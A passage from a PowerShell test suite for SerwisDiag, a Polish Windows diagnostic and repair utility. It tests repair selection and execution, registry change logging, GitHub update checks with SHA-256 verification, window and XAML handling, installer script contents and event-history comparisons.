    foreach ($x in $F) { $fs += [pscustomobject]@{ CheckId = $x[0]; Title = $x[1]; Status = $x[2]; Value = $x[3]; Category = 'system'; Details = ''; Advice = 'Rada'; Private = $false } }
    return @{ Result = [pscustomobject]@{ Findings = $fs; Meta = @{ Ticket = 'T-1'; Technician = 'Jan' } }; IsAdmin = $Admin; Offline = $Off }
}
$ctx = New-MockCtx -F @(
    , @('up.cbs', 'Magazyn składników (DISM CheckHealth)', 'warn', 'Uszkodzony, ale możliwy do naprawy')
    , @('nw.connectivity', 'Zegar systemowy', 'warn', 'Różnica względem serwera: 12 min')
    , @('se.platform', 'Secure Boot', 'warn', 'Wyłączony w BIOS/UEFI'))
$cand = @(Get-SdFixCandidates -Context $ctx)
$byId = @{}
foreach ($c in $cand) { $byId[$c.FixId] = $c }
Assert-That 'naprawy: uszkodzony magazyn -> DISM i SFC zalecane' ($byId['fx.dism'] -and $byId['fx.dism'].Default -and $byId['fx.sfc'] -and $byId['fx.sfc'].Default)
Assert-That 'naprawy: rozjechany zegar -> synchronizacja' ($byId['fx.time'] -and $byId['fx.time'].Default)
Assert-That 'naprawy: kolejnosc DISM przed SFC' ($byId['fx.dism'].Order -lt $byId['fx.sfc'].Order)
$unf = @(Get-SdUnfixedProblems -Result $ctx.Result -Candidates $cand)
Assert-That 'naprawy: Secure Boot zostaje dla serwisanta' ($unf.Count -eq 1 -and $unf[0].Title -eq 'Secure Boot')
$cand2 = @(Get-SdFixCandidates -Context (New-MockCtx -F @(, @('up.cbs', 'Magazyn składników (DISM CheckHealth)', 'warn', 'x')) -Admin $false))
Assert-That 'naprawy: bez administratora - zablokowane i odznaczone' (@($cand2 | Where-Object { $_.FixId -eq 'fx.dism' -and $_.Blocked -match 'administratora' -and -not $_.Default }).Count -eq 1)
$cand3 = @(Get-SdFixCandidates -Context (New-MockCtx -F @(, @('up.cbs', 'Magazyn składników (DISM CheckHealth)', 'warn', 'x')) -Off $true))
Assert-That 'naprawy: tryb bez internetu - DISM zablokowany, SFC dostepny' (@($cand3 | Where-Object { $_.FixId -eq 'fx.dism' -and $_.Blocked -match 'internetu' }).Count -eq 1 -and @($cand3 | Where-Object { $_.FixId -eq 'fx.sfc' -and -not $_.Blocked }).Count -eq 1)
$cand4 = @(Get-SdFixCandidates -Context (New-MockCtx -F @(, @('ev.crash', 'Nieoczekiwane restarty (bez BSOD)', 'warn', '2 w ciągu 90 dni'))))
Assert-That 'naprawy: restarty bez BSOD nie uruchamiaja SFC' (@($cand4 | Where-Object { $_.FixId -eq 'fx.sfc' }).Count -eq 0)
$cand5 = @(Get-SdFixCandidates -Context (New-MockCtx -F @(, @('nw.connectivity', 'Ping do internetu (1.1.1.1, 8.8.8.8)', 'warn', 'utrata pakietów do 25%'))))
Assert-That 'naprawy: utrata czesci pakietow nie proponuje resetu sieci' (@($cand5 | Where-Object { $_.FixId -eq 'fx.winsock' }).Count -eq 0)
$cand6 = @(Get-SdFixCandidates -Context (New-MockCtx -F @(, @('nw.connectivity', 'Ping do internetu (1.1.1.1, 8.8.8.8)', 'crit', 'Brak odpowiedzi'))))
Assert-That 'naprawy: brak internetu proponuje reset sieci (odznaczony)' (@($cand6 | Where-Object { $_.FixId -eq 'fx.winsock' -and -not $_.Default }).Count -eq 1)

# ---------------------------------------------------------------- naprawy: wykonanie (naprawy przykladowe)
$savedFixes = $global:SdFixes
$global:SdFixes = New-Object System.Collections.ArrayList
Register-Fix -Id 't.ok' -Group 'G' -Title 'Dobra' -Order 2 -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply { param($Data, $Log) [void]$Log.Add('a -> b'); 'zrobione' }
Register-Fix -Id 't.warn' -Group 'G' -Title 'Czesciowa' -Order 3 -Reboot -Detect { [pscustomobject]@{ Problem = 'p'; CustomerTitle = 'Neutralnie' } } -Apply { param($Data, $Log) [pscustomobject]@{ Result = 'warn'; Message = 'czesciowo'; Reboot = $false } }
Register-Fix -Id 't.err' -Group 'G' -Title 'Zla' -Order 1 -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply { param($Data, $Log) throw 'awaria testowa' }
Register-Fix -Id 't.adm' -Group 'G' -Title 'Admin' -Order 4 -NeedsAdmin -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply { param($Data, $Log) 'nie powinno sie wykonac' }
Register-Fix -Id 't.multi' -Group 'G' -Title 'Wiele' -Order 5 -DefaultOff -Detect { foreach ($i in 1, 2) { [pscustomobject]@{ Key = [string]$i; Title = 'Pozycja ' + $i; Data = $i } } } -Apply { param($Data, $Log) 'pozycja ' + $Data }
$tc = @(Get-SdFixCandidates -Context @{ Result = $null; IsAdmin = $false; Offline = $false })
Assert-Equal 'wykonanie: liczba pozycji' $tc.Count 6
Assert-That 'wykonanie: pozycje wielokrotne z wlasnym kluczem i domyslnie odznaczone' (@($tc | Where-Object { $_.FixId -eq 't.multi' -and -not $_.Default }).Count -eq 2 -and @($tc | Where-Object { $_.Key -eq 't.multi|2' }).Count -eq 1)
$st = @{}
$tr = @(Invoke-SdFixes -Candidates $tc -Status $st)
$global:SdFixes = $savedFixes
Assert-Equal 'wykonanie: kolejnosc wg Order' (($tr | ForEach-Object { $_.FixId }) -join ',') 't.err,t.ok,t.warn,t.adm,t.multi,t.multi'
Assert-That 'wykonanie: wyjatek = blad z komunikatem' ($tr[0].Result -eq 'error' -and $tr[0].Message -match 'awaria testowa')
Assert-That 'wykonanie: zmiany w dzienniku' ($tr[1].Result -eq 'ok' -and $tr[1].Message -eq 'zrobione' -and @($tr[1].Changes)[0] -eq 'a -> b')
Assert-That 'wykonanie: wynik czesciowy i nadpisany restart' ($tr[2].Result -eq 'warn' -and -not $tr[2].Reboot)
Assert-That 'wykonanie: zablokowana pominieta' ($tr[3].Result -eq 'skip' -and $tr[3].Message -match 'administratora')
Assert-That 'wykonanie: dane pozycji przekazane' ($tr[5].Message -eq 'pozycja 2')
Assert-Equal 'wykonanie: postep' $st['Total'] 6
$rd2 = Join-Path ([IO.Path]::GetTempPath()) ('sdfix-' + [guid]::NewGuid().ToString('N'))
$lp = Save-SdRepairLog -Results $tr -Meta @{ Ticket = 'Z-9'; Technician = 'Jan' } -OutDir $rd2
$lt = [IO.File]::ReadAllText($lp)
Assert-That 'dziennik napraw: nazwa i tresc' ((Split-Path $lp -Leaf) -like 'Z-9_*_naprawy.txt' -and $lt -match '\[BŁĄD\] Zla - awaria testowa' -and $lt -match 'zmiana: a -> b' -and $lt -match 'Zlecenie: Z-9')
Remove-Item -LiteralPath $rd2 -Recurse -Force
$wt = Get-SdRepairWorkText $tr
Assert-That 'opis wykonanych napraw: tylko udane, z nazwa neutralna' ($wt -match '- Dobra' -and $wt -match '- Neutralnie' -and $wt -notmatch 'Czesciowa' -and $wt -notmatch 'Zla')

# ---------------------------------------------------------------- naprawy: funkcje pomocnicze
$u = ConvertTo-SdUninstallCommand 'MsiExec.exe /I{12345678-1234-1234-1234-123456789012}'
Assert-That 'deinstalacja: MSI /I -> /X' ($u.File -eq 'msiexec.exe' -and $u.Arguments -eq '/X {12345678-1234-1234-1234-123456789012}')
$u = ConvertTo-SdUninstallCommand '"C:\Program Files\Optymalizator\unins000.exe" /SILENT'
Assert-That 'deinstalacja: sciezka w cudzyslowie' ($u.File -eq 'C:\Program Files\Optymalizator\unins000.exe' -and $u.Arguments -eq '/SILENT')
$u = ConvertTo-SdUninstallCommand ($env:SystemRoot + '\System32\cmd.exe /c echo')
Assert-That 'deinstalacja: sciezka bez cudzyslowu' ($u.File -eq ($env:SystemRoot + '\System32\cmd.exe') -and $u.Arguments -eq '/c echo')
Assert-That 'deinstalacja: puste polecenie' ($null -eq (ConvertTo-SdUninstallCommand ''))
$dv = New-SdStartupDisabledValue (New-Object DateTime(2026, 1, 1))
Assert-That 'autostart: wartosc wylaczenia jak w Menedzerze zadan' ($dv.Length -eq 12 -and $dv[0] -eq 3 -and $dv[1] -eq 0)
Assert-That 'autostart: odczyt stanu' ((Test-SdStartupApprovedEnabled ([byte[]](2, 0, 0, 0))) -and -not (Test-SdStartupApprovedEnabled $dv) -and (Test-SdStartupApprovedEnabled $null))
Assert-Equal 'ostatni wiersz wyjscia (CR, NUL)' (Get-SdLastLine ("Weryfikacja 10%`rWeryfikacja 100%`r`n`r`nNie znaleziono naruszen.`r`n" -replace '(.)', ('$1' + [char]0))) 'Nie znaleziono naruszen.'
$tk = 'HKCU:\Software\SerwisDiagTest_' + [guid]::NewGuid().ToString('N')
$lg = New-Object System.Collections.ArrayList
Set-SdRegValueLogged -Path $tk -Name 'Wartosc' -Value 5 -Log $lg
Set-SdRegValueLogged -Path $tk -Name 'Wartosc' -Value 7 -Log $lg
Remove-SdRegValueLogged -Path $tk -Name 'Wartosc' -Log $lg
Remove-Item -LiteralPath $tk -Recurse -Force -ErrorAction SilentlyContinue
Assert-That 'rejestr: dziennik zmian z poprzednia wartoscia' ($lg.Count -eq 3 -and $lg[0] -match '\(brak\) -> 5$' -and $lg[1] -match '5 -> 7$' -and $lg[2] -match '7 -> \(usunięto\)$')

# ---------------------------------------------------------------- 1.1: wersja, baza wiedzy, nowe wersje
Assert-That 'wersja programu' ($global:SdVersion -match '^\d+\.\d+\.\d+$' -and $global:SdLicense -eq 'MIT' -and $global:SdAuthor)
$kb = Get-SdKnowledgeInfo -Now (Get-Date)
Assert-That 'baza wiedzy: data weryfikacji odczytana' ($null -ne $kb.Date -and $kb.Text -match '^stan na \d{2}\.\d{2}\.\d{4}')
$kb1 = Get-SdKnowledgeInfo -Now $kb.Date.AddDays(30)
Assert-That 'baza wiedzy: swieza' (-not $kb1.Stale -and $kb1.AgeDays -eq 30)
$kb2 = Get-SdKnowledgeInfo -Now $kb.Date.AddDays(400)
Assert-That 'baza wiedzy: po pol roku ostrzezenie' ($kb2.Stale -and $kb2.Text -match 'ponad 13 miesięcy') $kb2.Text
Assert-That 'baza wiedzy: cofniety zegar bez ostrzezenia' (-not (Get-SdKnowledgeInfo -Now $kb.Date.AddDays(-30)).Stale)
Assert-Equal 'GitHub: repozytorium z adresu' (Get-SdGitHubRepo 'https://github.com/konto/serwis-diag') 'konto/serwis-diag'
Assert-Equal 'GitHub: adres z .git i ukosnikiem' (Get-SdGitHubRepo 'https://github.com/konto/serwis-diag.git/') 'konto/serwis-diag'
Assert-Equal 'GitHub: inny adres' (Get-SdGitHubRepo 'https://example.com/a/b') ''
Assert-Equal 'wersja z tagu v1.2' ([string](ConvertTo-SdVersion 'v1.2')) '1.2.0'
$rel = Get-SdLatestRelease -ProjectUrl 'https://github.com/konto/serwis-diag' -Json '{"tag_name":"v99.0.1","html_url":"https://github.com/konto/serwis-diag/releases/tag/v99.0.1"}'
Assert-That 'nowa wersja: wykryta' ($rel.Ok -and $rel.Newer -and $rel.Latest -eq '99.0.1' -and $rel.Url -match 'releases/tag')
$rel2 = Get-SdLatestRelease -ProjectUrl 'https://github.com/konto/serwis-diag' -Json ('{"tag_name":"v' + $global:SdVersion + '"}')
Assert-That 'nowa wersja: biezaca jest najnowsza' ($rel2.Ok -and -not $rel2.Newer -and (Get-SdLatestReleaseText $rel2) -match 'najnowszą')
Assert-That 'nowa wersja: bez adresu projektu nic nie sprawdza' (-not (Get-SdLatestRelease -ProjectUrl '').Ok)

# ---------------------------------------------------------------- 1.1: okna (rozmiar na malym ekranie, XAML)
. (Join-Path $SdRoot 'lib\Gui.ps1')
$fit = Get-SdFitWindowSize -Width 1260 -Height 840 -MinWidth 1040 -MinHeight 680 -AreaWidth 1093 -AreaHeight 576
Assert-That 'okno: maly ekran - w granicach ekranu i zmaksymalizowane' ($fit.Width -eq 1093 -and $fit.Height -eq 576 -and $fit.MinHeight -eq 576 -and $fit.MinWidth -eq 1040 -and $fit.Maximize)
$fit2 = Get-SdFitWindowSize -Width 1260 -Height 840 -MinWidth 1040 -MinHeight 680 -AreaWidth 1920 -AreaHeight 1040
Assert-That 'okno: duzy ekran - bez zmian' ($fit2.Width -eq 1260 -and $fit2.Height -eq 840 -and $fit2.MinHeight -eq 680 -and -not $fit2.Maximize)
Add-Type -AssemblyName PresentationFramework
foreach ($xn in 'SdUiXaml', 'SdUiSettingsXaml', 'SdUiCompareXaml', 'SdUiDriversXaml', 'SdUiFixesXaml', 'SdUiMissingXaml', 'SdUiUndoXaml', 'SdUiBackupXaml', 'SdUiAboutXaml', 'SdMonitorXaml') {
    $xe = ''
    try { [void][Windows.Markup.XamlReader]::Load((New-Object System.Xml.XmlNodeReader ([xml](Get-Variable -Name $xn -Scope Global -ValueOnly)))) } catch { $xe = $_.Exception.Message }
    Assert-That ('XAML okna: ' + $xn) (-not $xe) $xe
}

# ---------------------------------------------------------------- 1.1.1: okno napraw - zadania w tle (naprawy przykladowe, bez zmian w systemie)
$trs = [runspacefactory]::CreateRunspace()
$trs.Open()
$tpar = @{}
$tpar['Keys'] = [string[]]@('a', 'b'); $tpar['Values'] = 'v'; $tpar['Count'] = 3
$tps = New-SdUiTaskPs -Runspace $trs -Script 'param($Keys, $Values, $Count) (($Keys -join ",") + "|" + $Values + "|" + $Count)' -Params $tpar
$tpo = @($tps.Invoke())
$tps.Dispose(); $trs.Dispose()
Assert-Equal 'zadanie w tle: parametry o nazwach Keys/Values/Count dochodza' ([string]$tpo[0]) 'a,b|v|3'
$crs = [runspacefactory]::CreateRunspace()
$crs.Open()
$cps = New-SdUiTaskPs -Runspace $crs -Script @'
param($Root)
$SdRoot = $Root
. (Join-Path $Root 'lib\Load.ps1')
$miss = @()
foreach ($f in $global:SdFixes) {
    foreach ($sb in @($f.Detect, $f.Apply)) {
        foreach ($c in $sb.Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)) {
            $nm = $c.GetCommandName()
            if ($nm -and -not (Get-Command -Name $nm -ErrorAction SilentlyContinue)) { $miss += ($f.Id + ': ' + $nm) }
        }
    }
}
[pscustomobject]@{ Fixes = @($global:SdFixes).Count; Missing = @($miss | Select-Object -Unique) }
'@ -Params @{ Root = $SdRoot }
$cmo = @($cps.Invoke()) | Select-Object -Last 1
$cps.Dispose(); $crs.Dispose()
Assert-That 'naprawy w runspace okna: tylko polecenia dostepne bez Gui.ps1' ($cmo -and $cmo.Fixes -gt 20 -and @($cmo.Missing).Count -eq 0) (@($cmo.Missing) -join '; ')
$fxDir = Join-Path ([IO.Path]::GetTempPath()) ('sdokno-' + [guid]::NewGuid().ToString('N'))
$savedUi = $global:SdUi
$global:SdUi = @{ Root = $SdRoot; Settings = @{ ReportDir = $fxDir }; Result = [pscustomobject]@{ Findings = @(); Meta = @{ Ticket = 'OKNO-1' } }; C = @{ FooterText = [pscustomobject]@{ Text = '' } }; FixDlg = $null }
$fd = New-SdUiFixDialog
$global:SdUi.FixDlg = $fd
# runspace okna: naprawy przykladowe i zastepczy punkt przywracania
$fprep = New-SdUiTaskPs -Runspace $fd.Rs -Script @'
param($Root)
$SdRoot = $Root
. (Join-Path $Root 'lib\Load.ps1')
$global:SdFixLoaded = $true
$global:SdFixes.Clear()
$global:SdTestRestorePoints = 0
function global:New-SdRepairRestorePoint { $global:SdTestRestorePoints++ }
Register-Fix -Id 'fx.restoreon' -Group 'G' -Title 'Ochrona systemu' -Order 5 -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply { param($Data, $Log) 'ochrona wlaczona' }
Register-Fix -Id 't.okno' -Group 'G' -Title 'Pierwsza' -Order 10 -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply { param($Data, $Log) [void]$Log.Add('x -> y'); 'zrobione w oknie' }
Register-Fix -Id 't.okno2' -Group 'G' -Title 'Druga' -Order 11 -DefaultOff -Detect { foreach ($i in 1, 2) { [pscustomobject]@{ Key = [string]$i; Title = 'Pozycja ' + $i; Data = $i } } } -Apply { param($Data, $Log) 'pozycja ' + $Data }
(Get-Command New-SdRepairRestorePoint).Definition
'@ -Params @{ Root = $SdRoot }
$fstub = [string](@($fprep.Invoke()) | Select-Object -Last 1)
$fprep.Dispose()
function Wait-SdTestFixTask {
    $t0 = Get-Date
    while (-not $global:SdUi.FixDlg.Async.IsCompleted -and ((Get-Date) - $t0).TotalSeconds -lt 120) { Start-Sleep -Milliseconds 100 }
    Complete-SdUiFixTask
}
Start-SdUiFixTask -Phase 'detect' -Script $global:SdUiFixScripts.Detect -Params @{ Root = $SdRoot; Result = $global:SdUi.Result; IsAdmin = $false; Offline = $false }
Wait-SdTestFixTask
Assert-That 'okno napraw: pozycje z polami wyboru, zalecane zaznaczone' (@($fd.Boxes).Count -eq 4 -and @($fd.Boxes | Where-Object { $_.IsChecked }).Count -eq 2) $fd.N.FStatus.Text
if ($fstub -match 'SdTestRestorePoints') {
    Start-SdUiFixSelected -FixKeys ([string[]]@($fd.Boxes | ForEach-Object { [string]$_.Tag })) -Restore $true
    Wait-SdTestFixTask   # punkt przywracania - po nim okno samo uruchamia naprawy
    Wait-SdTestFixTask   # naprawy
}
$fres = @($fd.Results)
Assert-Equal 'okno napraw: wykonane wszystkie zaznaczone' (($fres | ForEach-Object { $_.FixId + '=' + $_.Result }) -join ',') 'fx.restoreon=ok,t.okno=ok,t.okno2=ok,t.okno2=ok'
$fq = New-SdUiTaskPs -Runspace $fd.Rs -Script '$global:SdTestRestorePoints'
$frp = @($fq.Invoke())
$fq.Dispose()
Assert-That 'okno napraw: punkt przywracania raz, ochrona systemu bez powtorzenia' ([int]$frp[0] -eq 1 -and @($fres | Where-Object { $_.FixId -eq 'fx.restoreon' }).Count -eq 1)
$fjs = @(Get-ChildItem -LiteralPath $fxDir -Filter '*_naprawy.json' -ErrorAction SilentlyContinue)
$fjo = $(if ($fjs.Count -eq 1) { ConvertFrom-Json ([IO.File]::ReadAllText($fjs[0].FullName)) } else { $null })
Assert-That 'okno napraw: dziennik z wynikami i zmianami' ($fjo -and @($fjo.results).Count -eq 4 -and $fjs[0].Name -like 'OKNO-1_*' -and [IO.File]::ReadAllText([IO.Path]::ChangeExtension($fjs[0].FullName, '.txt')) -match 'zmiana: x -> y')
Assert-That 'okno napraw: podsumowanie' ($fd.N.FStatus.Text -match 'wykonano 4 z 4') $fd.N.FStatus.Text
Start-SdUiFixSelected -FixKeys ([string[]]@('t.brak|')) -Restore $false
Wait-SdTestFixTask
Assert-That 'okno napraw: niewykonana naprawa to blad, a nie "0 z 0"' (@($fd.Results).Count -eq 1 -and $fd.Results[0].Result -eq 'error' -and $fd.Results[0].Message -match 'nie wykonał 1 zaznaczonej naprawy') $fd.N.FStatus.Text
$fd.Rs.Dispose()
$global:SdUi = $savedUi
Remove-Item -LiteralPath $fxDir -Recurse -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------- 1.2: instalator (kopia zainstalowana, skrypt Inno Setup)
$ir = Join-Path ([IO.Path]::GetTempPath()) ('sdinst-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path $ir -Force)
$docsSd = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'SerwisDiag'
$pc = @(Get-SdReportDirCandidates -Root $ir -Settings @{ ReportDir = '' })
Assert-That 'raporty: kopia przenosna - obok programu, potem Dokumenty' (-not (Test-SdInstalledCopy $ir) -and $pc[0] -eq (Join-Path $ir 'raporty') -and $pc[1] -eq $docsSd)
[IO.File]::WriteAllText((Join-Path $ir 'instalacja.ini'), "[SerwisDiag]`r`nWersja=1.2.0`r`n")
$ic = @(Get-SdReportDirCandidates -Root $ir -Settings @{ ReportDir = '' })
Assert-That 'raporty: kopia zainstalowana - Dokumenty\SerwisDiag, potem obok programu' ((Test-SdInstalledCopy $ir) -and $ic[0] -eq $docsSd -and $ic[1] -eq (Join-Path $ir 'raporty'))
Assert-Equal 'raporty: katalog z ustawien zawsze pierwszy' (@(Get-SdReportDirCandidates -Root $ir -Settings @{ ReportDir = 'D:\Raporty' }))[0] 'D:\Raporty'
Remove-Item -LiteralPath $ir -Recurse -Force
$iss = [IO.File]::ReadAllText((Join-Path $SdRoot 'tools\installer\SerwisDiag.iss'))
$isec = [regex]::Match($iss, '(?ms)^\[InstallDelete\]\s*$(.*?)(?=^\[|\z)').Groups[1].Value
$idel = @([regex]::Matches($isec, 'Name:\s*"\{app\}\\([^"]+)"') | ForEach-Object { $_.Groups[1].Value })
$itops = @(@(Get-SdProgramFiles $SdRoot | ForEach-Object { ($_ -split '\\')[0] }) + 'manifest.sha256' | Select-Object -Unique)
$iun = @($itops | Where-Object { $t = $_; @($idel | Where-Object { $t -like $_ }).Count -eq 0 })
Assert-That 'instalator: aktualizacja usuwa wszystkie pliki programu poprzedniej wersji' ($idel.Count -gt 0 -and $iun.Count -eq 0) ($iun -join ', ')
$pv = Get-SdPendingUpdateVerdict @([pscustomobject]@{ Aktualizacja = 'Aktualizacja analizy zabezpieczeń dla Microsoft Defender Antivirus — KB2267602'; Definicje = $true })
Assert-That 'aktualizacje: same definicje antywirusa to nie problem' ($pv.Status -eq 'ok' -and $pv.Value -match 'oczekuje: 1') $pv.Value
$pv2 = Get-SdPendingUpdateVerdict @([pscustomobject]@{ Aktualizacja = 'Defender'; Definicje = $true }, [pscustomobject]@{ Aktualizacja = 'KB5099999'; Definicje = $false }, [pscustomobject]@{ Aktualizacja = '.NET'; Definicje = $false })
Assert-That 'aktualizacje: inne niz definicje - ostrzezenie z ich liczba' ($pv2.Status -eq 'warn' -and $pv2.Value -match '^2 aktualizacje oczekują' -and $pv2.Advice) $pv2.Value
Assert-That 'instalator: znacznik kopii zainstalowanej i staly AppId' ($iss -match 'Filename:\s*"\{app\}\\instalacja\.ini"' -and $iss -match '#define AppIdGuid "AE0C12A0-8B14-4AB1-92F2-60F22A71E506"' -and $iss -match 'AppId=\{\{\{#AppIdGuid\}\}')
Assert-That 'instalator: monitorowanie wlaczane i wylaczane (takze przy odinstalowaniu)' ($iss -match '-EnableMonitor -NoStart"; Flags: runhidden waituntilterminated; Tasks: monitor' -and $iss -match '-DisableMonitor"; Flags: runhidden waituntilterminated; Tasks: not monitor' -and $iss -match '(?s)\[UninstallRun\].*-DisableMonitor' -and $iss -match 'Key: "Tryb"; String: "wszyscy"; Check: IsAdminInstallMode')

# ---------------------------------------------------------------- 1.3: wyniki z historii zdarzen - data ostatniego zdarzenia, „bez nowych zdarzen”
$global:SD = New-SdContext -Root $SdRoot -Level Quick
$global:SD.Cur.Category = 'events'; $global:SD.Cur.Id = 'ev.crash'
$le1 = Get-Date '2026-10-14 20:08:30'
Add-Finding 'Nieoczekiwane restarty (bez BSOD)' -Status warn -Value '2 w ciągu 90 dni (ostatnie 30 dni: 2)' -LastEvent $le1
Add-Finding 'Z opisem dla klienta' -Status warn -Value 'x' -CustomerValue 'y' -LastEvent $le1
Add-Finding 'Zwykly' -Status ok -Value 'z'
$hf = @($global:SD.Findings)
Assert-That 'historia zdarzen: data ostatniego zdarzenia w wartosci' ($hf[0].Value -eq '2 w ciągu 90 dni (ostatnie 30 dni: 2); ostatnio 2026-10-14 20:08' -and $hf[0].LastEvent -eq $le1) $hf[0].Value
Assert-That 'historia zdarzen: takze w wersji dla klienta, zwykly wynik bez zmian' ($hf[1].Customer.Value -eq 'y; ostatnio 2026-10-14 20:08' -and $null -eq $hf[2].LastEvent -and $hf[2].Value -eq 'z')
Assert-Equal 'najpozniejszy czas z listy' (Get-SdLatestTime @([pscustomobject]@{ Time = $le1.AddDays(-3) }, [pscustomobject]@{ Time = $le1 }, $null) 'Time') $le1
Assert-That 'najpozniejszy czas: pusta lista' ($null -eq (Get-SdLatestTime @()))
$global:SD.Started = $le1.AddDays(1); $global:SD.Finished = $le1.AddDays(1).AddMinutes(1)
$hj = Join-Path ([IO.Path]::GetTempPath()) ('sdhist-' + [guid]::NewGuid().ToString('N') + '.json')
[IO.File]::WriteAllText($hj, (ConvertTo-SdJsonReport -Result (Get-SdResult)), (New-Object Text.UTF8Encoding($false)))
$hi = Import-SdReportJson $hj
Remove-Item -LiteralPath $hj -Force
Assert-That 'historia zdarzen: JSON zachowuje date zdarzenia i poczatek diagnostyki' ($hi.Findings[0].LastEvent -eq $le1 -and $null -eq $hi.Findings[2].LastEvent -and $hi.Started -eq $le1.AddDays(1))
$hb = New-MockResult -When $le1.AddDays(2) -F @(
    , @('ev.crash', 'events', 'Nieoczekiwane restarty (bez BSOD)', 'warn', '2 w ciągu 90 dni')
    , @('ev.hardware', 'events', 'Błędy dysku i systemu plików', 'warn', '10 zdarzeń')
    , @('ev.services', 'events', 'Błędy usług', 'warn', '45 zdarzeń')
    , @('se.platform', 'security', 'Secure Boot', 'warn', 'Wyłączony'))
$hb | Add-Member -NotePropertyName Started -NotePropertyValue $le1.AddDays(2).AddMinutes(-3)
$ha = New-MockResult -When (Get-Date) -F @(
    , @('ev.crash', 'events', 'Nieoczekiwane restarty (bez BSOD)', 'warn', '2 w ciągu 90 dni')
    , @('ev.hardware', 'events', 'Błędy dysku i systemu plików', 'crit', '12 zdarzeń')
    , @('ev.services', 'events', 'Błędy usług', 'warn', '46 zdarzeń')
    , @('se.platform', 'security', 'Secure Boot', 'warn', 'Wyłączony'))
$ha.Findings[0] | Add-Member -NotePropertyName LastEvent -NotePropertyValue $le1
$ha.Findings[1] | Add-Member -NotePropertyName LastEvent -NotePropertyValue $le1.AddDays(1)
$ha.Findings[2] | Add-Member -NotePropertyName LastEvent -NotePropertyValue $le1.AddDays(2)   # już po rozpoczęciu diagnostyki przed naprawą
$hc = New-SdComparison -Before $hb -After $ha
$hk = @{}
foreach ($it in $hc.Items) { $hk[$it.Title] = $it.Kind }
Assert-That 'porownanie: zdarzenia sprzed diagnostyki przed naprawa - bez nowych zdarzen' ($hk['Nieoczekiwane restarty (bez BSOD)'] -eq 'nonew' -and $hk['Błędy dysku i systemu plików'] -eq 'nonew') (($hc.Items | ForEach-Object { $_.Title + '=' + $_.Kind }) -join ', ')
Assert-That 'porownanie: nowe zdarzenie i wynik bez daty - bez zmian' ($hk['Błędy usług'] -eq 'remaining' -and $hk['Secure Boot'] -eq 'remaining')
Assert-That 'porownanie: licznik i podsumowanie bez nowych zdarzen' ($hc.Counts['nonew'] -eq 2 -and $hc.CustomerCounts['nonew'] -eq 2 -and (Get-SdComparisonSummaryText $hc.Counts) -match 'bez nowych zdarzeń: 2')
$hhC = New-SdComparisonHtml -Comparison $hc -Mode Customer
Assert-That 'porownanie HTML: sekcja bez nowych zdarzen z wyjasnieniem' ($hhC -match 'Bez nowych zdarzeń od poprzedniej diagnostyki \(2\)' -and $hhC -match 'BEZ NOWYCH ZDARZEŃ' -and $hhC -match '2 bez nowych zdarzeń' -and $hhC -match 'nie wystąpiły ponownie')
Assert-That 'porownanie: tytul z liczba bez nowych zdarzen' ($hhC -match 'Rozwiązano 0 z 4 problem[^<]*, bez nowych zdarzeń: 2')
$hb2 = New-MockResult -When $le1.AddDays(2) -F (, @('ev.crash', 'events', 'Nieoczekiwane restarty (bez BSOD)', 'warn', '2 w ciągu 90 dni'))
$ha2 = New-MockResult -When (Get-Date) -F (, @('ev.crash', 'events', 'Nieoczekiwane restarty (bez BSOD)', 'warn', '2 w ciągu 90 dni'))
$ha2.Findings[0] | Add-Member -NotePropertyName LastEvent -NotePropertyValue $le1
$hc2 = New-SdComparison -Before $hb2 -After $ha2
$hv = Get-SdComparisonVerdict -Items $hc2.Items -Counts $hc2.Counts
Assert-That 'porownanie: raport bez daty rozpoczecia (czas zapisu); same zdarzenia historyczne - werdykt OK' ($hc2.Items[0].Kind -eq 'nonew' -and $hv.Level -eq 'ok' -and $hv.Text -match 'nie powtórzyły') $hv.Text

# ---------------------------------------------------------------- 1.4: aktualizacje programu (GitHub, pliki file:// zamiast pobierania)
$rj = '{"tag_name":"v1.9.0","html_url":"https://github.com/konto/serwis-diag/releases/tag/v1.9.0","body":"Nowosci","assets":[{"name":"SerwisDiag-1.9.0-setup.exe","browser_download_url":"https://x/s.exe"},{"name":"SerwisDiag-1.9.0-setup.exe.sha256","browser_download_url":"https://x/s.sha"},{"name":"SerwisDiag-1.9.0.zip","browser_download_url":"https://x/z.zip"},{"name":"SerwisDiag-1.9.0.zip.sha256","browser_download_url":"https://x/z.sha"}]}'
$ra = Get-SdLatestRelease -ProjectUrl 'https://github.com/konto/serwis-diag' -Json $rj
Assert-That 'aktualizacje: pliki i opis wydania' ($ra.Newer -and $ra.Setup -eq 'https://x/s.exe' -and $ra.SetupSha -eq 'https://x/s.sha' -and $ra.Zip -eq 'https://x/z.zip' -and $ra.ZipSha -eq 'https://x/z.sha' -and $ra.SetupName -eq 'SerwisDiag-1.9.0-setup.exe' -and $ra.Notes -eq 'Nowosci')
$ud0 = Join-Path ([IO.Path]::GetTempPath()) ('sdupd-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path (Join-Path $ud0 'zrodlo') -Force)
# „instalator” do testu: kopia cmd.exe - ma numer wersji w pliku i nie jest uruchamiana
$fakeSetup = Join-Path $ud0 'zrodlo\SerwisDiag-T-setup.exe'
Copy-Item -LiteralPath (Join-Path $env:SystemRoot 'System32\cmd.exe') -Destination $fakeSetup
$fakeVer = [string](ConvertTo-SdVersion ([string](Get-Item -LiteralPath $fakeSetup).VersionInfo.FileVersion))
[IO.File]::WriteAllText(($fakeSetup + '.sha256'), ((Get-SdFileSha256 $fakeSetup) + '  SerwisDiag-T-setup.exe'))
$fu = { param($p) ([Uri]$p).AbsoluteUri }
$frel = [pscustomobject]@{ Latest = $fakeVer; Setup = (& $fu $fakeSetup); SetupSha = (& $fu ($fakeSetup + '.sha256')); SetupName = 'SerwisDiag-T-setup.exe' }
$fpath = Get-SdUpdatePackage -Release $frel -Dir (Join-Path $ud0 'pobrane')
